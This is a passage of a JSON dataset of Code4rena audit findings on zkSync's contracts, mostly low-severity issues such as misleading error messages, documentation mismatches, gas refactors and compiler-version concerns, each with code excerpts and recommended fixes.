      "content": "\n**File:** `Executor.sol`\n\nThis issue contains multiple of optimizations which requires code refactoring. Thus it was reported as separated finding.\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L481)\n```solidity\n481:     function _revertBatches(uint256 _newLastBatch) internal {\n482:         require(s.totalBatchesCommitted > _newLastBatch, \"v1\"); // The last committed batch is less than new last batch\n483:         require(_newLastBatch >= s.totalBatchesExecuted, \"v2\"); // Already executed batches cannot be reverted\n484: \n485:         if (_newLastBatch < s.totalBatchesVerified) {\n486:             s.totalBatchesVerified = _newLastBatch;\n487:         }\n488:         s.totalBatchesCommitted = _newLastBatch;\n489: \n490:         // Reset the batch number of the executed system contracts upgrade transaction if the batch\n491:         // where the system contracts upgrade was committed is among the reverted batches.\n492:         if (s.l2SystemContractsUpgradeBatchNumber > _newLastBatch) {\n493:             delete s.l2SystemContractsUpgradeBatchNumber;\n494:         }\n495: \n496:         emit BlocksRevert(s.totalBatchesCommitted, s.totalBatchesVerified, s.totalBatchesExecuted);\n```\nAt line 488, we assign `_newLastBatch` to state variable `s.totalBatchesCommitted`. Since this value is not being changed, we can re-use `_newLastBatch` at line 496, to avoid additional reading of a state variable: `emit BlocksRevert(_newLastBatch, s.totalBatchesVerified, s.totalBatchesExecuted);`.\n\nMoreover, `s.totalBatchesExecuted` is used twice and can be cached.\n\nAt line 485, when the condition if fulfilled, we will be reading `s.totalBatchesVerified` three times (line 485, 486, 487). We can re-factor the code to avoid additional reading of `s.totalBatchesVerified`. This is what needs to be done:\n1. move `s.totalBatchesCommitted = _newLastBatch` higher \n2. move `if (s.l2SystemContractsUpgradeBatchNumber > _newLastBatch)` higher\n3. rewrite `if (_newLastBatch < s.totalBatchesVerified)` to `if`-`else` condition, when `if` block will be executed, we will avoid additional reading.\nPlease notice that in that case, we will read `s.totalBatchesVerified` only twice (explained in the comment section)\n\n```\n   function _revertBatches(uint256 _newLastBatch) internal {\n        require(s.totalBatchesCommitted > _newLastBatch, \"v1\"); \n        uint256 cachedtotalBatchesExecuted = s.totalBatchesExecuted;\n        require(_newLastBatch >= cachedtotalBatchesExecuted, \"v2\"); \n\n        s.totalBatchesCommitted = _newLastBatch;  // line 488 can be moved higher\n\n        if (s.l2SystemContractsUpgradeBatchNumber > _newLastBatch) { // line 497 can be moved higher\n            delete s.l2SystemContractsUpgradeBatchNumber;\n        }\n\n        if (_newLastBatch < s.totalBatchesVerified) { // first read of `s.totalBatchesVerified`\n            s.totalBatchesVerified = _newLastBatch;  // when if returns true, 2nd read of `s.totalBatchesVerified`\n            emit BlocksRevert(_newLastBatch, _newLastBatch, cachedtotalBatchesExecuted);  // we can use _newLastBatch now\n        } else  {\n            emit BlocksRevert(_newLastBatch, s.totalBatchesVerified, cachedtotalBatchesExecuted); // when if returns false, 2nd read of `s.totalBatchesVerified`\n        }\n \n    }\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33245",
      "title": "[54] Wrong error message in `BaseZkSyncUpgradeGenesis::_setNewProtocolVersion`",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgradeGenesis.sol#L20-L41\n\n```solidity\n    function _setNewProtocolVersion(uint256 _newProtocolVersion) internal override {\n        uint256 previousProtocolVersion = s.protocolVersion;\n        require(\n            // Genesis Upgrade difference: Note this is the only thing change > to >=\n            _newProtocolVersion >= previousProtocolVersion,\n            \"New protocol version is not greater than the current one\"\n        );\n        require(\n            _newProtocolVersion - previousProtocolVersion <= MAX_ALLOWED_PROTOCOL_VERSION_DELTA,\n            \"Too big protocol version difference\"\n        );\n\n        // If the previous upgrade had an L2 system upgrade transaction, we require that it is finalized.\n        require(s.l2SystemContractsUpgradeTxHash == bytes32(0), \"Previous upgrade has not been finalized\");\n        require(\n            s.l2SystemContractsUpgradeBatchNumber == 0,\n            \"The batch number of the previous upgrade has not been cleaned\"\n        );\n\n        s.protocolVersion = _newProtocolVersion;\n        emit NewProtocolVersion(previousProtocolVersion, _newProtocolVersion);\n    }\n```\n\nThis function is used to change the protocol version, only case atttached here is the fact that if `_newProtocolVersion >= previousProtocolVersion,` does not hold true, the execution errors out with \"New protocol version is not greater than the current one\" instead of \"New protocol version is **not greater than or equal to** the current one\".\n\n### Impact\n\nInaccurate error messages, code confusion.\n\n### Recommended Mitigation Steps\n\nApply these changes to https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgradeGenesis.sol#L20-L41\n\n```diff\n    function _setNewProtocolVersion(uint256 _newProtocolVersion) internal override {\n        uint256 previousProtocolVersion = s.protocolVersion;\n        require(\n            // Genesis Upgrade difference: Note this is the only thing change > to >=\n            _newProtocolVersion >= previousProtocolVersion,\n            \"New protocol version is not greater than or equal to the current one\"\n        );\n        require(\n            _newProtocolVersion - previousProtocolVersion <= MAX_ALLOWED_PROTOCOL_VERSION_DELTA,\n            \"Too big protocol version difference\"\n        );\n\n        // If the previous upgrade had an L2 system upgrade transaction, we require that it is finalized.\n        require(s.l2SystemContractsUpgradeTxHash == bytes32(0), \"Previous upgrade has not been finalized\");\n        require(\n            s.l2SystemContractsUpgradeBatchNumber == 0,\n            \"The batch number of the previous upgrade has not been cleaned\"\n        );\n\n        s.protocolVersion = _newProtocolVersion;\n        emit NewProtocolVersion(previousProtocolVersion, _newProtocolVersion);\n    }\n```\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33244",
      "title": "[53] Users would assume proof verification is performed twice in `proveBatches()` due to a wrongly commenting out the `else` keyword and lack of documentation",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L386-L440\n\n```solidity\n    function _proveBatches(\n        StoredBatchInfo calldata _prevBatch,\n        StoredBatchInfo[] calldata _committedBatches,\n        ProofInput calldata _proof\n    ) internal {\n//ommited for brevity\n//@audit\n\n        if (_proof.serializedProof.length > 0) {\n            _verifyProof(proofPublicInput, _proof);\n        }\n        // #else\n        _verifyProof(proofPublicInput, _proof);\n        // #endif\n\n        emit BlocksVerification(s.totalBatchesVerified, currentTotalBatchesVerified);\n        s.totalBatchesVerified = currentTotalBatchesVerified;\n    }\n```\nThis function eventually gets called when proving the batches, now as tagged by \"@audit\", evidently, if the proof is not empty, it gets verified, due to the `if` block.\n\nWhere as one might look at this and assume there to be a logical error, as naturally if we are having an `if/else` conditional arrangement, then the else block should entain a different execution, but here that's not the case cause the preprocessor is going to remove one of the ` _verifyProof(proofPublicInput, _proof);`\n\n### Impact\n\nBad code structure, unclear documentation.\n\n### Recommended Mitigation Steps\n\nCorrectly apply the documentations attached to this.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33243",
      "title": "[52] The` storedBatchHash()` fails to distinguish between reverted and unreverted batches",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Getters.sol#L121-L125\n\n```solidity\n    /// @inheritdoc IGetters\n    function storedBatchHash(uint256 _batchNumber) external view returns (bytes32) {\n        return s.storedBatchHashes[_batchNumber];\n    }\n```\nNow consider this previously confirmed issue: https://github.com/code-423n4/2023-10-zksync-findings/issues?q=is%3Aissue+is%3Aopen+Inaccurate+Batch+Stored+Hash+Retrieval+in+Getters+Contract\n\nCase with the function's implementation is that, it returns zero for uncommitted batch numbers, but it lacks the capability to distinguish between a reverted and an unreverted batch. For example, if batch number 500 has been reverted, and a user queries `storedBatchHash(500)`, it returns a non-zero value, which may create the impression that the batch is unreverted. However, it should ideally return zero in such scenarios.\n\nNow evidently this is from a past report, but whereas protocol pronounced \"acknowledged\" findings to be OOS, this was `confirmed` and as such must have forgotten to be fixed.\n\n### Impact\n\nUsers would be misled on the status for batches in zkSync.\n\n### Recommended Mitigation Steps\n\nAs previously recommended, revise the function as the below:\n\n```solidity\nfunction storedBatchHash(uint256 _batchNumber) external view returns (bytes32) {\n        if(_batchNumber > s.totalBatchesCommitted){\n            return bytes32(0);\n        }\n        return s.storedBatchHashes[_batchNumber];\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33242",
      "title": "[51] `TransactionHelper::isEthToken()` is not used anywhere, so it should be removed",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/libraries/TransactionHelper.sol#L89-L97\n\n```solidity\n\n    function isEthToken(uint256 _addr) internal pure returns (bool) {\n        return _addr == uint256(uint160(address(BASE_TOKEN_SYSTEM_CONTRACT))) || _addr == 0;\n    }\n\n```\n\nThis function is used to know whether the `address` passed is th `Ether` address, and also returns true if the address passed is `0x0` (for conveniency) as stated [here](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/libraries/TransactionHelper.sol#L92), issue with this is tht using this search command: [https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync+isEthToken&type=code](https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync+isEthToken&type=code) we can see that this function is not used anywhere.\n\n### Impact\n\nRemove redundant code as they most of the time hint flawed implementation.\n\n### Recommended Mitigation Steps\n\nRemove the `isEthToken()` function since it's not being used anywhere.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33241",
      "title": "[50] Airdrops are automatically lost for the `L1ERC20Bridge`",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol\n\nContract is obviously a bridge that allows for the depositing of ERC20 tokens to hyperchains, this means that the contract at some point would hold a lot of tokens and could be eligible for some airdrops, since its most likely going to be based on the snapshot of the token balance, now clearly this contract does not entail any sweeping functions and as such all airdrops sent to this contract are effectively stuck\n\n### Impact\n\nLeak of value since there are no methods to get hold of the airdrops.\n\n### Recommended Mitigation Steps\n\nIntroduce a sweeper functionality for these cases.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33240",
      "title": "[49] Fix documentation in regards to timing requirements so code doesn't deviate from docs",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/SystemContext.sol#L428-L434\n\n```solidity\n    function _ensureBatchConsistentWithL2Block(uint128 _newTimestamp) internal view {\n        uint128 currentBlockTimestamp = currentL2BlockInfo.timestamp;\n        require(\n            _newTimestamp > currentBlockTimestamp,\n            \"The timestamp of the batch must be greater than the timestamp of the previous block\"\n        );\n    }\n```\nNow look at this section of the docs https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/docs/Smart%20contract%20Section/Batches%20%26%20L2%20blocks%20on%20zkSync.md#timing-invariants\n\nWe can see that it's been wrongly stated that `For each L2 block its timestamp should be ≥ timestamp of the batch it belongs to` case is with the code implementation we can see that the check is instead strictly greater than.\n\n### Impact\n\nBad code structure, making it harder to understand implementation.\n\n### Recommended Mitigation Steps\n\nFix the docs, change https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/docs/Smart%20contract%20Section/Batches%20%26%20L2%20blocks%20on%20zkSync.md#timing-invariants to `For each L2 block its timestamp should be **>** timestamp of the batch it belongs to`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33239",
      "title": "[48] Always update comments in code if it's already the deadline",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L14\n\n```solidity\n/// @notice NOTE: The `getZkSyncMeta` that is used to obtain this struct will experience a breaking change in 2024.\nstruct ZkSyncMeta {\n    uint32 pubdataPublished;\n    uint32 heapSize;\n    uint32 auxHeapSize;\n    uint8 shardId;\n    uint8 callerShardId;\n    uint8 codeShardId;\n}\n```\n\nThe attached snippets suggests that there would be a breaking change to the struct in 2024, but we are in 2024 and the comment needs to updated to either another year or atleast a more specific time even if not months, could be anything like \"Q3/Q4 2024\"\n\n### Impact\n\nConfused code, appplications really hoping to build around this wouldn't know if to go on with their development/deployment since they don't know if the breaking change is going to affect their to be deployed logic, and also don't have a definitive on when this breaking change would occur.\n\n### Recommended Mitigation Steps\n\nConsider having a more specific time in regards to when the breaking change would occur.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33238",
      "title": "[47] Remove instances of unnecessary casting",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/libraries/PriorityQueue.sol#L45\n\n```solidity\n\n    /// @return The total number of unprocessed priority operations in a priority queue\n    function getSize(Queue storage _queue) internal view returns (uint256) {\n        return uint256(_queue.tail - _queue.head);\n    }\n\n```\n\nBut from [here ](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/libraries/PriorityQueue.sol#L45) we can see that both `_queue.tail ` & `_queue.head` are of `unit256` already so there's no need for this casting.\n\n### Recommended Mitigation Steps\n\nRemove the unnecessary casting.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33237",
      "title": "[46] Protocol should consider supporting deposits of pure erc20s",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nHere is how a token's deposit gets finalized: https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/zksync/contracts/bridge/L2SharedBridge.sol#L97\n\nThat is the contract creates the token address if the deposit for this token has never been made, but before that the user needs to deposit their tokens via the L1 shared bridge.\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L243-L267\n\n```solidity\n    function _getDepositL2Calldata(\n        address _l1Sender,\n        address _l2Receiver,\n        address _l1Token,\n        uint256 _amount\n    ) internal view returns (bytes memory) {\n        bytes memory gettersData = _getERC20Getters(_l1Token);\n        return abi.encodeCall(IL2Bridge.finalizeDeposit, (_l1Sender, _l2Receiver, _l1Token, _amount, gettersData));\n    }\n\n    /// @dev Receives and parses (name, symbol, decimals) from the token contract\n    function _getERC20Getters(address _token) internal view returns (bytes memory) {\n        if (_token == ETH_TOKEN_ADDRESS) {\n            bytes memory name = bytes(\"Ether\");\n            bytes memory symbol = bytes(\"ETH\");\n            bytes memory decimals = abi.encode(uint8(18));\n            return abi.encode(name, symbol, decimals); // when depositing eth to a non-eth based chain it is an ERC20\n        }\n        //@audit using staticcall for a call that is going to revert? Not all tokens support the name, symbol and decimal getters\n        (, bytes memory data1) = _token.staticcall(abi.encodeCall(IERC20Metadata.name, ()));\n        (, bytes memory data2) = _token.staticcall(abi.encodeCall(IERC20Metadata.symbol, ()));\n        (, bytes memory data3) = _token.staticcall(abi.encodeCall(IERC20Metadata.decimals, ()));\n        return abi.encode(data1, data2, data3);\n    }\n```\nThis function is inevitably called whenever executing `depositLegacyErc20Bridge()` & `bridgehubDeposit()`, used to generate a calldata for calling the deposit finalization, issue is that while the call is being routed to `_getERC20Getters()` and in the case where the token is not eth, protocol assumes the token implements the `name(), symbol(), & decimals()` function, but contrary to this assumption, these getter functions are not part of the original `EIP20` specification and as such not all tokens support this, causing an attempt get this deposit calldata revert for pure EIP20 tokens.\n\n### Impact\n\nPure eip-20 tokens are not supported, since there is an inability to execute both `depositLegacyErc20Bridge()` & `bridgehubDeposit()` functions for these tokens\n\n### Recommended Mitigation Steps\n\nReimplement a logic to allow for the support of pure eip20 tokens.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33236",
      "title": "[45] Fix bootloader's documentation in regards to unread memory points",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L1937-L1962\n\n```yul\n            function shouldMsgValueMimicCallBeSystem(to, dataPtr) -> ret {\n                let dataLen := mload(dataPtr)\n                // Note, that this point it is not fully known whether it is indeed the selector\n                // of the calldata (it might not be the case if the `dataLen` < 4), but it will be checked later on\n                let selector := shr(224, mload(add(dataPtr, 32)))\n\n                let isSelectorCreate := or(\n                    eq(selector, {{CREATE_SELECTOR}}),\n                    eq(selector, {{CREATE_ACCOUNT_SELECTOR}})\n                )\n                let isSelectorCreate2 := or(\n                    eq(selector, {{CREATE2_SELECTOR}}),\n                    eq(selector, {{CREATE2_ACCOUNT_SELECTOR}})\n                )\n\n                // Firstly, ensure that the selector is a valid deployment function\n                ret := or(\n                    isSelectorCreate,\n                    isSelectorCreate2\n                )\n                // Secondly, ensure that the callee is ContractDeployer\n                ret := and(ret, eq(to, CONTRACT_DEPLOYER_ADDR()))\n                // Thirdly, ensure that the calldata is long enough to contain the selector\n                ret := and(ret, gt(dataLen, 3))\n            }\n```\nThis function returns whether the mimicCall should use the `isSystem` flag, issue here is that this statement ` // Note, that this point it is not fully known whether it is indeed the selector...` and should instead be `// Note that, at this point it is not fully known whether it is indeed the selector...`\n\n### Impact\n\nBad code structure, harder to understand code since integrators would assume one is talking about the unread memory point at the end of `dataLen`\n\n### Recommended Mitigation Steps\n\nApply the fix.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33235",
      "title": "[44] Double addressed tokens can be stolen from the bridge",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nWhile depositing the contract calls to see if the deposits have been cleared with token addresses, case here is that in most of the logic, it doesn't consider that a user can just specify the second address if the first one doesn't go through.\n\n### Recommended Mitigation Steps\n\nConsider not supporting these types of tokens.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33234",
      "title": "[43]&nbsp;`StateTransitionManager.sol::createNewChain()` has some nuances with it's `initData`",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L238-L288\n\n```solidity\n    /// @notice called by Bridgehub when a chain registers\n    function createNewChain(\n        uint256 _chainId,\n        address _baseToken,\n        address _sharedBridge,\n        address _admin,\n        bytes calldata _diamondCut\n    ) external onlyBridgehub {\n        if (stateTransition[_chainId] != address(0)) {\n            // StateTransition chain already registered\n            return;\n        }\n\n        // check not registered\n        Diamond.DiamondCutData memory diamondCut = abi.decode(_diamondCut, (Diamond.DiamondCutData));\n\n        // check input\n        bytes32 cutHashInput = keccak256(_diamondCut);\n        require(cutHashInput == initialCutHash, \"StateTransition: initial cutHash mismatch\");\n\n        // construct init data\n        bytes memory initData;\n        /// all together 4+9*32=292 bytes\n        initData = bytes.concat(\n            IDiamondInit.initialize.selector,\n            bytes32(_chainId),\n            bytes32(uint256(uint160(bridgehub))),\n            bytes32(uint256(uint160(address(this)))),\n            bytes32(uint256(protocolVersion)),\n            bytes32(uint256(uint160(_admin))),\n            bytes32(uint256(uint160(validatorTimelock))),\n            bytes32(uint256(uint160(_baseToken))),\n            bytes32(uint256(uint160(_sharedBridge))),\n            bytes32(storedBatchZero),\n            diamondCut.initCalldata\n        );\n\n        diamondCut.initCalldata = initData;\n        // deploy stateTransitionContract\n        DiamondProxy stateTransitionContract = new DiamondProxy{salt: bytes32(0)}(block.chainid, diamondCut);\n\n        // save data\n        address stateTransitionAddress = address(stateTransitionContract);\n\n        stateTransition[_chainId] = stateTransitionAddress;\n\n        // set chainId in VM\n        _setChainIdUpgrade(_chainId, stateTransitionAddress);\n\n        emit StateTransitionNewChain(_chainId, stateTransitionAddress);\n    }\n```\n\nEvidently, the logic for `initData` seems to expect 292 bytes, hence this comment: \" /// all together 4+9&ast;32=292 bytes\" but going through the logic below, we can see that the function after passing in the `292` bytes, i.e the selector and all 9 `byte32` elements, it still passes the initData to be concated, which seems as a flawed logic as the whole concated value is later on set as the same `initData`.\n\n### Impact\n\nBad code structure, `initData` is expected to be `292` bytes but is accepted to be longer.\n\n### Recommended Mitigation Steps\n\nConsider clearly limiting this to `292` bytes or clearly document that this is to be extended in the future.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33233",
      "title": "[42] `execute()` & `executeInstant()` could use `msg.value` in a better manner",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/Governance.sol#L167-L202\n\n```solidity\n\n    function execute(Operation calldata _operation) external payable onlyOwnerOrSecurityCouncil {\n        bytes32 id = hashOperation(_operation);\n        // Check if the predecessor operation is completed.\n        _checkPredecessorDone(_operation.predecessor);\n        // Ensure that the operation is ready to proceed.\n        require(isOperationReady(id), \"Operation must be ready before execution\");\n        // Execute operation.\n        _execute(_operation.calls);\n        // Reconfirming that the operation is still ready after execution.\n        // This is needed to avoid unexpected reentrancy attacks of re-executing the same operation.\n        require(isOperationReady(id), \"Operation must be ready after execution\");\n        // Set operation to be done\n        timestamps[id] = EXECUTED_PROPOSAL_TIMESTAMP;\n        emit OperationExecuted(id);\n    }\n\n    /// @notice Executes the scheduled operation with the security council instantly.\n    /// @dev Only the security council may execute an operation instantly.\n    /// @param _operation The operation parameters will be executed with the upgrade.\n    function executeInstant(Operation calldata _operation) external payable onlySecurityCouncil {\n        bytes32 id = hashOperation(_operation);\n        // Check if the predecessor operation is completed.\n        _checkPredecessorDone(_operation.predecessor);\n        // Ensure that the operation is in a pending state before proceeding.\n        require(isOperationPending(id), \"Operation must be pending before execution\");\n        // Execute operation.\n        _execute(_operation.calls);\n        // Reconfirming that the operation is still pending before execution.\n        // This is needed to avoid unexpected reentrancy attacks of re-executing the same operation.\n        require(isOperationPending(id), \"Operation must be pending after execution\");\n        // Set operation to be done\n        timestamps[id] = EXECUTED_PROPOSAL_TIMESTAMP;\n        emit OperationExecuted(id);\n    }\n\n        function _execute(Call[] calldata _calls) internal {\n        for (uint256 i = 0; i < _calls.length; ++i) {\n            (bool success, bytes memory returnData) = _calls[i].target.call{value: _calls[i].value}(_calls[i].data);\n            if (!success) {\n                // Propagate an error if the call fails.\n                assembly {\n                    revert(add(returnData, 0x20), mload(returnData))\n                }\n            }\n        }\n    }\n```\n\nWe can see that both functions are marked as payable and then call on the internal `_execute()`, but the codeflow does not assert that the provided `msg.value` is equal to the one that is been expended in `_execut()`.\n\n### Impact\n\nMisappropriation of funds for operations, as if the `msg.value` is less than `call.value`, then funds in the contract for different operations would be used for the current one.\n\n### Recommended Mitigation Steps\n\nConsider requiring that the `msg.value` provided is the `call.value` needed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33232",
      "title": "[41] `0.8.20` is vulnerable to some bugs and compiler version should be updated to be on the safe side",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nSee https://github.com/ethereum/solidity/blob/afda6984723fca99e82ebf34d0aec1804f1f3ce6/docs/bugs_by_version.json#L1865-L1871\nwe can see that this compiler version is vulnerable to:\n\n- Use this search command: [https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync%20.selector&type=code](https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync%20.selector&type=code), we can see that protocol in multiple instances implement the `.selector()` query, would be key to note that, as explained in [this blog](https://soliditylang.org/blog/2023/07/19/missing-side-effects-on-selector-access-bug/) there are multiple side effects with accessing .selector() for the current compiler version, since it could cause potentially incorrect behavior of contracts compiled using the legacy pipeline.\n\n-Considering the protocol's heavy use of `yul`, a different version of compiler should be used, cause this version is vulnerable to the full inliner non expression split argument evaluation order bug, explained [here](https://blog.soliditylang.org/2023/07/19/full-inliner-non-expression-split-argument-evaluation-order-bug/), do note that this could heavily cause reordering reverts in the bootloader or even it's return may lead to storage writes, memory writes, or event emissions not being performed. It may also lead to the contract not reverting (and therefore not rolling back some operations) when it should or vice-versa, and as such an updated version should be used.\n\n- Lastly, would be key to note that `verbatim` is also used heavily protocol, for example even in the blob versioned hash receiver https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/utils/BlobVersionedHashRetriever.yul but this is also a tad affected by this compiler's verion of being vulnerable to the [verbatim invalid deduplication bug](https://soliditylang.org/blog/2023/11/08/verbatim-invalid-deduplication-bug/), note that the TLDR of this bug as understood is that wherein equivalent assembly blocks are identified and merged. `verbatim` assembly items surrounded by identical opcodes were incorrectly considered identical and unified, that's in the Block Deduplicator optimizer step, currently the `BlobVersionedHashRetriever.yul` only queries the verbatim, just once so no issue of the bug coming in place to unify similar blocks.\n\n### Recommended Mitigation Steps\n\nConsider updating the solididity compiler version.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33231",
      "title": "[40] There exist a light deviation between the Ethereum VM and zK's in regards to eth deposits",
      "impact": "LOW",
